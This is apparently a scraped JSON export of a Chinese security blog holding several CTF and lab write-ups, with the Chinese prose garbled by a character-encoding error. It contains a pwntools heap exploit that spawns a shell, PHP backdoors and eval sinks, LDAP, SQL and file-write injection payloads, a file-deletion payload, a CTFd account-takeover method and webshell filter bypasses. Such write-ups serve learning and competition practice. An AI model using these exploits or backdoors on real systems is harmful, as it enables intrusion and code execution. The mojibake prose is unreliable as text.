æ¥ç€ç”¨stokenå·¥å…·å¯¼å…¥token ç”ŸæˆOTP æˆåŠŸç™»å½•åï¼Œè·³è½¬åˆ°page.phpé¡µé¢ï¼Œå¯ä»¥æ‰§è¡Œå‘½ä»¤ ä½†æ˜¯æç¤ºæˆ‘ä»¬ldapuseræƒé™ä¸å¤Ÿä¸èƒ½æ‰§è¡Œå‘½ä»¤ï¼Œè¿™é‡Œæœ‰ä¸¤ç§åŠæ³•ï¼š å¯¹groupå±æ€§è¿›è¡Œæ³¨å…¥ï¼Œå³æŠŠåé¢groupå±æ€§çš„filteræˆªæ–­ 12345678910(&amp; (&amp; (pager&#x3D;&lt;token&gt;) (uid&#x3D;ldapuser)))%00 ) (| (group&#x3D;root) (group&#x3D;adm) )) ä½¿ç”¨*é€šé…ç¬¦ä½œä¸ºç”¨æˆ·åç™»å½• è¿™é‡Œæ¼”ç¤ºä¸€ä¸‹ç¬¬ä¸€ç§æ–¹æ¡ˆï¼Œpayloadç›´æ¥æ”¾åˆ°burpä¸­ 1ldapuser%2529%2529%2529%2500 å†å»æ‰§è¡Œlså‘½ä»¤ è¯»å–page.phpæ–‡ä»¶ï¼š SSHç™»å½•ï¼šfdapuser:e398e27d5c4ad45086fe431120932a01","tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"},{"name":"HTB","slug":"HTB","permalink":"http://ca0y1h.top/tags/HTB/"}],"categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"}]},{"title":"æ˜Ÿç›Ÿ6æœˆAWDå¤ç›˜â€”â€”web+pwn","date":"2020-07-04T04:32:33.000Z","path":"Web_security/ctf_writeup/18.æ˜Ÿç›Ÿ6æœˆAWDå¤ç›˜â€”â€”web+pwn/","text":"æ˜Ÿç›Ÿ6æœˆAWDå¤ç›˜â€”â€”web+pwn PWNç”±é˜Ÿå†…gamouså¸ˆå‚…å’Œremilaå¸ˆå‚…æ’°å†™ PWN PWN1 idaæ²¡æ³•åç¼–è¯‘ï¼Œé€ æˆäº†å¾ˆå¤§çš„å›°æ‰°ï¼Œå¯ä»¥çœ‹åˆ°æœ‰é€‰é¡¹1æœ‰ä¸€ä¸ªæ˜æ˜¾çš„æ ˆæº¢å‡ºï¼Œè€Œä¸”ç›´æ¥è¾“å‡ºçš„è¯ä¹Ÿæœ‰æ®‹ç•™æŒ‡é’ˆï¼Œä½†åªæœ‰ä¸€æ¬¡æœºä¼šï¼Œæé«˜äº†åˆ©ç”¨éš¾åº¦ï¼Œä¿®å¤çš„è¯ç›´æ¥æŠŠreadçš„å€¼æ”¹äº† gameæ˜¯patchä¸¤æ¬¡gameçš„elfä¹‹åè®¾ç½®æƒé™æ‰§è¡Œï¼Œç›´æ¥æŠŠpatchçš„èµ‹å€¼nopæ‰äº† ç„¶åæ˜¯ä¸€ä¸ªnotepadï¼Œå †ä¸Šå¸¸è§çš„ç©æ³• æ²¡èƒ½åŠæ—¶å†™å‡ºexpä¸”èŠ±äº†å¤ªå¤šæ—¶é—´åœ¨è¿™é¢˜ä¸Š åœ¨notepadä¸Šdelte_markæœ‰ä¸€ä¸ªuaf,è„šæœ¬ä¸Šshow_markçš„å‡½æ•°ä¸€ç›´å†™é”™æˆdelte_markæ²¡æ³¨æ„åˆ°ï¼Œé”™è¿‡äº†ä¸€å †flag 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980from pwn import *sh = process(&#x27;./pwn&#x27;)context.log_level = &#x27;debug&#x27;#gdb.attach(sh)sh.recvuntil(&#x27;Your option:&#x27;)sh.sendline(&#x27;3&#x27;)elf = ELF(&#x27;./pwn&#x27;)libc = elf.libcdef new(size, content1, content2): sh.recvuntil(&#x27;-&gt; &#x27;) sh.sendline(&#x27;new&#x27;) sh.recvuntil(&#x27;-&gt; note size:&#x27;) sh.sendline(str(size)) sh.recvuntil(&#x27;-&gt; note name:&#x27;) sh.sendline(content1) sh.recvuntil(&#x27;-&gt; note content:&#x27;) sh.sendline(content2)def edit(idx, content1, content2): sh.recvuntil(&#x27;-&gt; &#x27;) sh.sendline(&#x27;edit&#x27;) sh.recvuntil(&#x27;-&gt; note index:&#x27;) sh.sendline(str(idx)) sh.recvuntil(&#x27;-&gt; note name:&#x27;) sh.sendline(content1) sh.recvuntil(&#x27;-&gt; note content:&#x27;) sh.sendline(content2)def delete(idx): sh.recvuntil(&#x27;-&gt; &#x27;) sh.sendline(&#x27;delete&#x27;) sh.recvuntil(&#x27;-&gt; note index:&#x27;) sh.sendline(str(idx))def show(idx): sh.recvuntil(&#x27;-&gt; &#x27;) sh.sendline(&#x27;show&#x27;) sh.recvuntil(&#x27;-&gt; note index:&#x27;) sh.sendline(str(idx))def mark(idx, content): sh.recvuntil(&#x27;-&gt; &#x27;) sh.sendline(&#x27;mark&#x27;) sh.recvuntil(&#x27;-&gt; index of note you want to mark:&#x27;) sh.sendline(str(idx)) sh.recvuntil(&#x27;-&gt; mark info:&#x27;) sh.sendline(content)def edit_mark(idx, content): sh.recvuntil(&#x27;-&gt; &#x27;) sh.sendline(&#x27;edit_mark&#x27;) sh.recvuntil(&#x27;-&gt; mark index:&#x27;) sh.sendline(str(idx)) sh.recvuntil(&#x27;-&gt; mark content:&#x27;) sh.sendline(content)def show_mark(idx): sh.recvuntil(&#x27;-&gt; &#x27;) sh.sendline(&#x27;show_mark&#x27;) sh.recvuntil(&#x27;-&gt; mark index:&#x27;) sh.sendline(str(idx))def delete_mark(idx): sh.recvuntil(&#x27;-&gt; &#x27;) sh.sendline(&#x27;delete_mark&#x27;) sh.recvuntil(&#x27;-&gt; mark index:&#x27;) sh.sendline(str(idx))new(0x100, &#x27;aaaaaaa&#x27;, &#x27;aaaaaa&#x27;) #0#gdb.attach(sh)mark(0, &#x27;aaaa&#x27;)delete_mark(0)new(0x10, &#x27;aaaaaa&#x27;, p32(0) * 2 + p32(0x0804BFC4) + p32(0x08048810))#1show_mark(0)libc_base = u32(sh.recvn(4)) - libc.sym[&#x27;puts&#x27;]system = libc_base + libc.sym[&#x27;system&#x27;]bin_sh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()edit(1, &#x27;a&#x27;, p32(0) * 2 + p32(bin_sh_addr) + p32(system))show_mark(0)print(hex(libc_base))#gdb.attach(sh)sh.interactive() PWN2 pwn2ä»éš¾åº¦ä¸Šæ¯”pwn1ç®€å•ä¸å°‘ï¼Œå¯æƒœåœ¨pwn1ä¸Šçœ‹çš„å¤ªä¹…ï¼Œæ²¡æ³¨æ„pwn2æ”¾é¢˜ï¼Œé”™è¿‡äº†å¥½å¤šç™½èŠ±èŠ±çš„flag ç¬¬ä¸€ä¸ªæ´ backdoor åˆ©ç”¨ è¾“å…¥+1ç­‰äº0å³å¯æ‰§è¡Œsystem unsigned intæ•´æ•°ä¸Šæº¢å³å¯è¾¾åˆ°0 1234p=remote(ip,port)p.sendline(str(4294967295))p.sendline(&quot;/bin/sh&quot;)p.sendline(&quot;cat flag&quot;) ä¿®å¤ æ”¹caseçš„å€¼æˆ–è€…nopæ‰systeméƒ½å¯ ç¬¬äºŒä¸ªæ´ delete_order åˆ©ç”¨ freeåæ²¡æœ‰ç½®NULLè‚¯å®šæ˜¯UAF ä¿®å¤ ç®€å•ç²—æš´nopæ‰freeäº† å½“ç„¶æ­£ç¡®åšæ³•åº”è¯¥æ˜¯jmpå‡ºå»ç”¨è¡¥ä¸Šç½®NULLçš„è¿‡ç¨‹ ç¬¬ä¸‰ä¸ªæ´ comment 123456789puts(&quot;Size:&quot;);scanf(&quot;%d&quot;, &amp;v1);buf = malloc(v1);puts(&quot;Your name:&quot;);read(0, buf, v1);write(1, buf, v1);puts(&quot;Comments:&quot;);scanf(&quot;%s&quot;, &amp;format);printf(&amp;format); åˆ©ç”¨ æ ¼å¼åŒ–å­—ç¬¦ä¸² ä¿®å¤ ç”¨putsæ›¿ä»£printfé¿å…æ ¼å¼åŒ–è§£æ ç¬¬å››ä¸ªæ´ order 12345678910puts(&quot;Your name:&quot;);buf = malloc(0x10uLL);read(0, buf, 0x10uLL);puts(&quot;Size:&quot;);scanf(&quot;%d&quot;, &amp;size);if ( (unsigned int)size &lt;= 0x50 )&#123; puts(&quot;Baozi name:&quot;); v5 = malloc((unsigned int)size); scanf(&quot;%s&quot;, v5) åˆ©ç”¨ ä½¿ç”¨scanf(&quot;%s&quot;,&amp;x)çš„æ–¹å¼è¯»å…¥å­—ç¬¦ä¸²ï¼Œå­˜åœ¨æº¢å‡º å †æº¢å‡º ä¿®å¤ nopï¼ æ­£ç¡®åšæ³•åº”è¯¥æ˜¯jmpå‡ºå»ç”¨fgetsæˆ–è€…readæ›¿ä»£è¯»å…¥æœ‰é™é•¿åº¦çš„å­—ç¬¦ä¸² WEB web1 é“¾æ¥ï¼šhttps://pan.baidu.com/s/1JPDSOLIH13nJfsx-8YScvA æå–ç ï¼š9nln web1ç•™ä¸‹æ¥çš„ç‰ˆæœ¬æ˜¯æˆ‘ä¿®å¤ä¹‹åï¼Œæœ‰çš„æ¼æ´ä¸å¤ªèƒ½æƒ³çš„èµ·æ¥ã€‚ã€‚ é¢„ç•™åé—¨ åé—¨1 1234567// admin/header.php&lt;?php $p=$_GET[&#x27;p&#x27;]; echo $p; $q=exec($p); var_dump($q);?&gt; åé—¨2 12345678// admin/footer.php&lt;?php $shell=$_POST[&#x27;shell&#x27;]; system($shell); if($shell !=&quot;&quot;)&#123; exit(); &#125;?&gt; åé—¨3 12345678// footer.php&lt;?php $shell=$_POST[&#x27;shell&#x27;]; system($shell); if($shell !=&quot;&quot;)&#123; exit(); &#125;?&gt; SQLæ³¨å…¥ 123456789101112// search.php&lt;?php include &#x27;header.php&#x27;; include_once(&#x27;config.php&#x27;); if (!empty($_GET[&#x27;id&#x27;])) &#123; $id=$_GET[&#x27;id&#x27;]; $query = &quot;SELECT * FROM news WHERE id=$id&quot;; $data = mysqli_query($dbc,$query); &#125; $com = mysqli_fetch_array($data); var_dump($com);?&gt; ä¿®å¤ï¼š 12345$filter = &quot;regexp|from|count|procedure|and|ascii|substr|substring|left|right|union|if|case|pow|exp|order|sleep|benchmark|into|load|outfile|dumpfile|load_file|join|show|select|update|set|concat|delete|alter|insert|create|union|or|drop|not|for|join|is|between|group_concat|like|where|user|ascii|greatest|mid|substr|left|right|char|hex|ord|case|limit|conv|table|mysql_history|flag|count|rpad|\\&amp;|\\*|\\.|-&quot;;if((preg_match(&quot;/&quot;.$filter.&quot;/is&quot;,$id)== 1))&#123; die();&#125; ååºåˆ—åŒ– è¿™ä¸ªæ¯”èµ›çš„æ—¶å€™æ—¶é—´æ¯”è¾ƒç´§å¼ ï¼Œæ„Ÿè§‰ååºåˆ—åŒ–çš„å‚æ•°æ˜¯ä¸å¯æ§çš„ï¼Œç»“æŸåå¤ç›˜æ„Ÿè§‰åº”è¯¥å¯ä»¥ç»“åˆä¸Šé¢çš„SQLæ³¨å…¥æ¼æ´ä¸€èµ·åˆ©ç”¨ï¼Œå…ˆåˆ é™¤newsè¡¨åŸæœ‰çš„è®°å½•ï¼Œç„¶åæ’å…¥ååºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥é€ æˆä»»æ„æ–‡ä»¶è¯»å–ã€‚ 12345678910111213141516171819202122232425// contact.php&lt;?php class Test &#123; public $f = &quot;index.php&quot;; public $g = &quot;fi&quot;; public $h = &quot;le&quot;; public $i = &quot;_g&quot;; public $j = &quot;et_c&quot;; public $k = &quot;ont&quot;; public $l = &quot;ents&quot;; public function __wakeup() &#123; $qw=$this-&gt;g . $this-&gt;h . $this-&gt;i . $this-&gt;j . $this-&gt;k . $this-&gt;l; var_dump($qw($this-&gt;f)); &#125;&#125; $e = &quot;un&quot;; $f = &quot;se&quot;; $g = &quot;ri&quot;; $h = &quot;al&quot;; $i = &quot;ize&quot;; $query = &quot;SELECT * FROM news;&quot;; $data = mysqli_query($dbc,$query); while($t = mysqli_fetch_array($data)) &#123; $qwe=$e.$f.$g.$h.$i; $qwe($t[1]);&#125; ?&gt; è¿˜æœ‰ä¸€ä¸ªå¯ç–‘çš„ç‚¹ï¼š 12345678910// services.php&lt;?php class User &#123; public $name = &#x27;&#x27;; function __destruct()&#123; eval(&quot;$this-&gt;name&quot;); &#125; &#125; $user = new User; $user-&gt;name = &#x27;&#x27;.$_POST[&#x27;frame&#x27;]; ?&gt; web3 é“¾æ¥ï¼šhttps://pan.baidu.com/s/1AYZftYQ8nQyMHx7-1XSn7g æå–ç ï¼švcr0 web1ç©çš„æœ‰ç‚¹å¿ƒæ€å´©äº†ã€‚ã€‚ã€‚ã€‚ å¼±å£ä»¤ 1admin&#x2F;admin æ–‡ä»¶åŒ…å« 1&#x2F;example2.php?page&#x3D;flag é¢„ç½®flag 1234567// core/features/userlist.php$fi = fopen(strrev(&quot;galf/&quot;),&quot;r&quot;);$sss= &quot;&lt;!--&quot;.strrev(base64_encode(fread($fi,256))).&quot;--&gt;&quot;;fclose($fi);.....if (strpos($user_flags,&#x27;s&#x27;) !== false) $th .= &#x27;&lt;td&#x27;.$bg.&#x27;&gt;&#x27;.$sss.&#x27;&lt;/td&gt;&#x27;; payloadï¼š 1shows.php?imod&#x3D;userlist&amp;user_flags&#x3D;s ä»»æ„æ–‡ä»¶å†…å®¹å†™å…¥ ç¬¬ä¸€å¤„ 1234567// inc/wizards.phpforeach ($_REQUEST[&#x27;language&#x27;] as $ks =&gt; $vs)&#123; // a=&gt;1\\&quot;;phpinfo();// // $lang[&quot;a&quot;] = &quot; . str_replace(&#x27;&quot;&#x27;, &#x27;\\&quot;&#x27;, &#x27;1\\&quot;;phpinfo();//&#x27;); // $lang[&quot;a&quot;] = &quot;1\\\\&quot;;phpinfo();// fwrite($lx, &#x27;$lang[&quot;&#x27;.$ks.&#x27;&quot;] = &quot;&#x27;.str_replace(&#x27;&quot;&#x27;, &#x27;\\&quot;&#x27;, $vs).&#x27;&quot;;&#x27;.&quot;\\n&quot;);&#125; payloadï¼š 1&#x2F;index.php?mod&#x3D;wizard&amp;action&#x3D;language&amp;language[a]&#x3D;1\\%22;phpinfo();&#x2F;&#x2F; ç¬¬äºŒå¤„ 1234567891011// inc/wizards.php$handler = fopen(SERVDIR.&quot;/cdata/rss_config.php&quot;, &quot;w&quot;) or msg(&quot;error&quot;, lang(&#x27;Error!&#x27;), &quot;Can not open file ./cdata/rss_config.php&quot;);fwrite($handler, &quot;&lt;?PHP \\n\\n//RSS Configurations (Auto Generated file)\\n\\n&quot;);fwrite($handler, &quot;\\$rss_news_include_url = \\&quot;&quot;.htmlspecialchars($rss_news_include_url).&quot;\\&quot;;\\n\\n&quot;);fwrite($handler, &quot;\\$rss_title = \\&quot;&quot;.htmlspecialchars($rss_title).&quot;\\&quot;;\\n\\n&quot;);fwrite($handler, &quot;\\$rss_encoding = \\&quot;&quot;.htmlspecialchars($rss_encoding).&quot;\\&quot;;\\n\\n&quot;);fwrite($handler, &quot;\\$rss_language = \\&quot;&quot;.htmlspecialchars($rss_language).&quot;\\&quot;;\\n\\n&quot;);fwrite($handler, &quot;?&gt;&quot;);fclose($handler); payloadï¼š 123456789101112131415161718192021&#x2F;index.php?mod&#x3D;wizard&amp;action&#x3D;dosaverss&amp;rss_news_url&#x3D;http:&#x2F;&#x2F;example.com&amp;rss_title&#x3D;assert&amp;rss_encode&#x3D;$_GET[1]&amp;rss_language&#x3D;$&#123;rss_title($rss_encode)&#125;&#96;&#96;&#96;&#96;#### ä»»æ„æ–‡ä»¶åˆ é™¤&#96;&#96;&#96;php&#x3D;&#x2F;&#x2F; inc&#x2F;images.phpelseif ($action &#x3D;&#x3D; &quot;doimagedelete&quot;)&#123; CSRFCheck(); if(!isset($images)) msg(&quot;info&quot;, lang(&quot;No Images selected&quot;), lang(&quot;You must select images to be deleted&quot;), &#39;#GOBACK&#39;); foreach ($images as $image) unlink(SERVDIR.&quot;&#x2F;uploads&#x2F;&quot;.$image) or print(lang(&quot;Could not delete image&quot;).&quot; &lt;b&gt;$file&lt;&#x2F;b&gt;&quot;); msg(&quot;info&quot;, lang(&quot;Image(s) Deleted&quot;), lang(&quot;The image was successfully deleted&quot;), &#39;#GOBACK&#39;);&#125; payload: 1&#x2F;index.php?mod&#x3D;iamges&amp;action&#x3D;doimagedelete&amp;images[1]&#x3D;..&#x2F;index.php","tags":[{"name":"ctf","slug":"ctf","permalink":"http://ca0y1h.top/tags/ctf/"}],"categories":[{"name":"ctf","slug":"ctf","permalink":"http://ca0y1h.top/categories/ctf/"}]},{"title":"buuctfåˆ·é¢˜â€”â€”æ¸—é€æµ‹è¯•ç¯‡","date":"2020-07-04T04:32:03.000Z","path":"Web_security/ctf_writeup/16.buuctfåˆ·é¢˜â€”â€”æ¸—é€æµ‹è¯•ç¯‡/","text":"BUUCTFâ€”â€”æ¸—é€æµ‹è¯•ç¯‡ GKCTF2020 è€å…«å°è¶…å¸‚å„¿ è€ƒç‚¹ å¼±å£ä»¤ç™»å½• shopxo1.8.0 åå°RCE è§£é¢˜ æ²¡å»æƒ³åå°åœ°å€å¼±å¯†ç è¿˜æ˜¯ç»éªŒå¤ªå°‘äº† ç„¶åå°±æ˜¯çœ‹ä¼ æ–‡ä»¶ç‚¹ï¼Œä¼ ä¸ªshellä¸Šå» ä½†æ˜¯æ–‡ä»¶å…·ä½“åœ¨å“ªåˆæ‰¾äº†åŠå¤© å¦‚æœä¼ åœ¨é»˜è®¤ä¸»é¢˜zipçš„default/__static__/shell.php é‚£ä¹ˆè®¿é—®è·¯ç”±åº”è¯¥æ˜¯ä¸‹é¢è¿™æ · 1&#x2F;public&#x2F;static&#x2F;index&#x2F;default&#x2F;shell.php getshellå®Œäº†ï¼Œæ ¹æ®æç¤ºï¼Œå»æ‰¾ç”Ÿæˆçš„è„šæœ¬ï¼ˆå› ä¸ºè¿™ä¸ªè„šæœ¬æ˜¯ç”±rootæƒé™+å®šæ—¶æ‰§è¡Œçš„ï¼‰ æ”¹é€ ä¸‹è¿™ä¸ªè„šæœ¬ï¼Œåå¼¹shellæˆ–è€…ç›´æ¥æ‰§è¡Œcatå‘½ä»¤ï¼Œå°±æ‹¿åˆ°rootæƒé™äº†ã€‚ BJDCTF 2nd SchroÌˆdinger è€ƒç‚¹ å¥‡æ€ªçš„è€ƒç‚¹ è§£é¢˜ æ‰“å¼€é¢˜ç›®æœ‰ä¸€ä¸ªtest.phpï¼Œæ˜¯ä¸€ä¸ªéœ€è¦ç™»å½•çš„ç½‘é¡µï¼Œçˆ†ç ´çš„targetåº”è¯¥å°±æ˜¯è¿™ä¸ªtest.php å¹¶ä¸”Forecast success rateæ˜¯æ ¹æ®JSä»£ç æ¥ç”Ÿæˆçš„ï¼Œå‘ç°çˆ†ç ´å¾ˆæ…¢ï¼ŒæŠ“åŒ…æŸ¥çœ‹å‘ç°æœ‰ä¸ªcookieæ˜¯base64åŠ å¯†ï¼Œè§£ç ä¹‹åå¾ˆåƒæ—¶é—´æˆ³ï¼Œç›´æ¥æ¸…ç©ºçœ‹çœ‹æ•ˆæœï¼Œå‘ç°ç›´æ¥99%ï¼Œç‚¹å‡»checkï¼Œå¼¹å‡ºæ¥Bilibiliçš„AVå·ã€‚ æ ¹æ®æ—¶é—´æŸ¥çœ‹è¯„è®ºå¾—åˆ°flagã€‚ æˆ‘è¿˜ä»¥ä¸ºè¦å»çœ‹åŒ—äº¬å¤§å­¦ é‡å­åŠ›å­¦çš„è§†é¢‘å‘¢ V&amp;N HappyCTFd è€ƒç‚¹ CTFd 1day è§£é¢˜ è€ƒå¯Ÿçš„æ˜¯CTFd v2.0.0 â€“ v2.2.2 account takeover å¯ä»¥ç›´æ¥çœ‹è¿™ç¯‡åˆ†æï¼šhttps://www.colabug.com/2020/0204/6940556/amp/ åˆ©ç”¨è¿‡ç¨‹ï¼š å…ˆåœ¨buuojæ³¨å†Œä¸ªé‚®ç®± åˆ©ç”¨é¦–å°¾æ·»åŠ ç©ºæ ¼ç»•è¿‡é™åˆ¶æ¥æ³¨å†Œä¸€ä¸ªä¸å—å®³è€…ç”¨æˆ·åç›¸åŒçš„è´¦å· æ‰¾å›å¯†ç é“¾æ¥å‘é€åˆ°è‡ªå·±çš„é‚®ç®± ä¿®æ”¹è‡ªå·±è´¦å·çš„ç”¨æˆ·åï¼ˆä¸å—å®³è€…ä¸åŒï¼‰ ç‚¹å‡»é‡ç½®å¯†ç é“¾æ¥ï¼Œè®¾ç½®æ–°å¯†ç  BJDCTF 2nd elementmaster è€ƒç‚¹ æƒ³è±¡åŠ› è§£é¢˜ è¿™é“é¢˜çœŸçš„æœ‰ç‚¹è„‘æ´å¤§å¼€äº†ã€‚ã€‚ã€‚ã€‚ æ‰“å¼€é¢˜ç›®æœ‰ä¸¤ä¸ªhideæ ‡ç­¾ï¼Œidå¾ˆå¯ç–‘ï¼Œæ„Ÿè§‰æ˜¯Hexç¼–ç ï¼Œç”¨å·¥å…·è½¬æ¢æˆASCIIæ‹¼æ¥åæ˜¯Po.phpã€‚ è¿™é‡Œå°±è¦çŸ¥é“Poæ˜¯ä¸€ä¸ªåŒ–å­¦å…ƒç´ ï¼Œå†ç»“åˆé¢˜ç›®å’Œå›¾ç‰‡ï¼ŒæŠŠæ‰€æœ‰çš„åŒ–å­¦å…ƒç´ éƒ½ç»™éå†ä¸€éã€‚ç›´æ¥çœ‹åˆ«äººçš„WPï¼Œè„šæœ¬å¦‚ä¸‹ï¼š 1234567891011121314151617181920# coding=utf-8import requestsperiodic_table = (&#x27;H&#x27;, &#x27;He&#x27;, &#x27;Li&#x27;, &#x27;Be&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;N&#x27;, &#x27;O&#x27;, &#x27;F&#x27;, &#x27;Ne&#x27;, &#x27;Na&#x27;, &#x27;Mg&#x27;, &#x27;Al&#x27;, &#x27;Si&#x27;, &#x27;P&#x27;, &#x27;S&#x27;, &#x27;Cl&#x27;, &#x27;Ar&#x27;, &#x27;K&#x27;, &#x27;Ca&#x27;, &#x27;Sc&#x27;, &#x27;Ti&#x27;, &#x27;V&#x27;, &#x27;Cr&#x27;, &#x27;Mn&#x27;, &#x27;Fe&#x27;, &#x27;Co&#x27;, &#x27;Ni&#x27;, &#x27;Cu&#x27;, &#x27;Zn&#x27;, &#x27;Ga&#x27;, &#x27;Ge&#x27;, &#x27;As&#x27;, &#x27;Se&#x27;, &#x27;Br&#x27;, &#x27;Kr&#x27;, &#x27;Rb&#x27;, &#x27;Sr&#x27;, &#x27;Y&#x27;, &#x27;Zr&#x27;, &#x27;Nb&#x27;, &#x27;Mo&#x27;, &#x27;Te&#x27;, &#x27;Ru&#x27;, &#x27;Rh&#x27;, &#x27;Pd&#x27;, &#x27;Ag&#x27;, &#x27;Cd&#x27;, &#x27;In&#x27;, &#x27;Sn&#x27;, &#x27;Sb&#x27;, &#x27;Te&#x27;, &#x27;I&#x27;, &#x27;Xe&#x27;, &#x27;Cs&#x27;, &#x27;Ba&#x27;, &#x27;La&#x27;, &#x27;Ce&#x27;, &#x27;Pr&#x27;, &#x27;Nd&#x27;, &#x27;Pm&#x27;, &#x27;Sm&#x27;, &#x27;Eu&#x27;, &#x27;Gd&#x27;, &#x27;Tb&#x27;, &#x27;Dy&#x27;, &#x27;Ho&#x27;, &#x27;Er&#x27;, &#x27;Tm&#x27;, &#x27;Yb&#x27;, &#x27;Lu&#x27;, &#x27;Hf&#x27;, &#x27;Ta&#x27;, &#x27;W&#x27;, &#x27;Re&#x27;, &#x27;Os&#x27;, &#x27;Ir&#x27;, &#x27;Pt&#x27;, &#x27;Au&#x27;, &#x27;Hg&#x27;, &#x27;Tl&#x27;, &#x27;Pb&#x27;, &#x27;Bi&#x27;, &#x27;Po&#x27;, &#x27;At&#x27;, &#x27;Rn&#x27;, &#x27;Fr&#x27;, &#x27;Ra&#x27;, &#x27;Ac&#x27;, &#x27;Th&#x27;, &#x27;Pa&#x27;, &#x27;U&#x27;, &#x27;Np&#x27;, &#x27;Pu&#x27;, &#x27;Am&#x27;, &#x27;Cm&#x27;, &#x27;Bk&#x27;, &#x27;Cf&#x27;, &#x27;Es&#x27;, &#x27;Fm&#x27;, &#x27;Md&#x27;, &#x27;No&#x27;, &#x27;Lr&#x27;, &#x27;Rf&#x27;, &#x27;Db&#x27;, &#x27;Sg&#x27;, &#x27;Bh&#x27;, &#x27;Hs&#x27;, &#x27;Mt&#x27;, &#x27;Ds&#x27;, &#x27;Rg&#x27;, &#x27;Cn&#x27;, &#x27;Nh&#x27;, &#x27;Fl&#x27;, &#x27;Mc&#x27;, &#x27;Lv&#x27;, &#x27;Ts&#x27;, &#x27;Og&#x27;, &#x27;Uue&#x27;)url = &quot;http://5fd398b5-f94f-4f8a-b379-797755b20891.node3.buuoj.cn/&quot;result = &quot;&quot;for element in periodic_table: req = requests.get(url + element + &quot;.php&quot;) if req.status_code != requests.codes.ok: continue result += req.textprint(result) è·‘å‡ºæ¥çš„å­—ç¬¦ä¸²æ‹¼æ¥æˆä¸€ä¸ªæ–‡ä»¶åï¼Œæ‰“å¼€å³æ˜¯flagã€‚","tags":[{"name":"ctf","slug":"ctf","permalink":"http://ca0y1h.top/tags/ctf/"}],"categories":[{"name":"ctf","slug":"ctf","permalink":"http://ca0y1h.top/categories/ctf/"},{"name":"æ¸—é€æµ‹è¯•","slug":"ctf/æ¸—é€æµ‹è¯•","permalink":"http://ca0y1h.top/categories/ctf/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"2020â€œç¬¬äº”ç©ºé—´â€æ™ºèƒ½å®‰å…¨å¤§èµ›çº¿ä¸Šèµ›CTF-Webå¤ç›˜","date":"2020-07-01T12:14:15.000Z","path":"Web_security/ctf_writeup/21.2020ç¬¬äº”ç©ºé—´æ™ºèƒ½å®‰å…¨å¤§èµ›çº¿ä¸Šèµ›CTF-Web/","text":"2020â€œç¬¬äº”ç©ºé—´â€æ™ºèƒ½å®‰å…¨å¤§èµ›çº¿ä¸Šèµ›CTF Webå¤ç›˜ hate-php [Solved] è€ƒç‚¹ æ— å­—æ¯webshell è§£é¢˜ 1234567891011121314151617&lt;?phperror_reporting(0);if(!isset($_GET[&#x27;code&#x27;]))&#123; highlight_file(__FILE__);&#125;else&#123; $code = $_GET[&#x27;code&#x27;]; if (preg_match(&#x27;/(f|l|a|g|\\.|p|h|\\/|;|\\&quot;|\\&#x27;|\\`|\\||\\[|\\]|\\_|=)/i&#x27;,$code)) &#123; die(&#x27;You are too good for me&#x27;); &#125; $blacklist = get_defined_functions()[&#x27;internal&#x27;]; foreach ($blacklist as $blackitem) &#123; if (preg_match (&#x27;/&#x27; . $blackitem . &#x27;/im&#x27;, $code)) &#123; die(&#x27;You deserve better&#x27;); &#125; &#125; assert($code);&#125; çœ‹åˆ°è¿™ä¸ªé¢˜ç¬¬ä¸€ååº”å°±æ˜¯æ— å­—æ¯webshellï¼Œå‚è€ƒè¿™ç¯‡æ–‡ç« ã€‚ ä½†æ˜¯åˆä¸å¤ªä¸€æ ·ï¼Œé¢˜ç›®æœ‰ä¸¤å±‚è¿‡æ»¤ï¼Œç¬¬ä¸€ä¸ªæ­£åˆ™è¿‡æ»¤äº†ä¸€äº›ç¬¦å·äº†flag.phä¸­ä»»æ„çš„å­—ç¬¦ï¼Œç¬¬äºŒä¸ªforeachè¿‡æ»¤äº†æ‰€æœ‰å†…ç½®å‡½æ•°ã€‚ å–å åˆ©ç”¨ä¸‹é¢çš„è„šæœ¬å–åï¼Œæ„é€ system(end(getallheaders())) 123def get(shell): hexbit=&#x27;&#x27;.join(map(lambda x: hex(~(-(256-ord(x)))),shell)) print(hexbit) ç„¶ååœ¨headeræœ€ååŠ ä¸Šcat flag.phpå³å¯ã€‚ å¼‚æˆ– å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼Œç®€å•åˆ†æä¸€ä¸‹ã€‚ 1234567891011121314&lt;?php$hhh = @$_GET[&#x27;_&#x27;];if (!$hhh)&#123; highlight_file(__FILE__);&#125;if(strlen($hhh)&gt;18)&#123; die(&#x27;One inch long, one inch strong!&#x27;);&#125;if ( preg_match(&#x27;/[\\x00- 0-9A-Za-z\\&#x27;&quot;\\`~_&amp;.,|=[\\x7F]+/i&#x27;, $hhh) ) die(&#x27;Try something else!&#x27;);$character_type = count_chars($hhh, 3);if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);eval($hhh);?&gt; å¯ä»¥çœ‹åˆ°è¿™é“é¢˜æ›´ä¸ºä¸¥æ ¼ï¼š ä¼ å…¥çš„å­—ç¬¦é•¿åº¦ä¸èƒ½è¶…è¿‡18ï¼› ç»•è¿‡preg_marchæ­£åˆ™è¡¨è¾¾å¼ count_chars()&gt;12çš„é‡å¤å­—ç¬¦ä¸²ç»•è¿‡ ç¬¬ä¸€ä¸ªå¯ä»¥ç”¨æ„é€ _GET[x]æ¥ç»•è¿‡ï¼Œé‡ç‚¹æ˜¯æ­£åˆ™è¡¨è¾¾å¼çš„ç»•è¿‡ï¼Œå…ˆæ¥çœ‹ä¸€ä¸‹è¿‡æ»¤äº†ä»€ä¹ˆå­—ç¬¦ï¼š æŸ¥çœ‹å½“å‰å¯ä»¥é€šè¿‡æ­£åˆ™æ£€æµ‹çš„å­—ç¬¦ï¼š 12345678&lt;?phpfor($i=0;$i&lt;256;$i++)&#123; if (!preg_match(&#x27;/[\\x00- 0-9A-Za-z\\&#x27;&quot;\\`~_&amp;.,|=[\\x7F]+/i&#x27;,chr($i)))&#123; echo $i; #echo chr($i); echo(&quot;,&quot;); &#125;&#125; 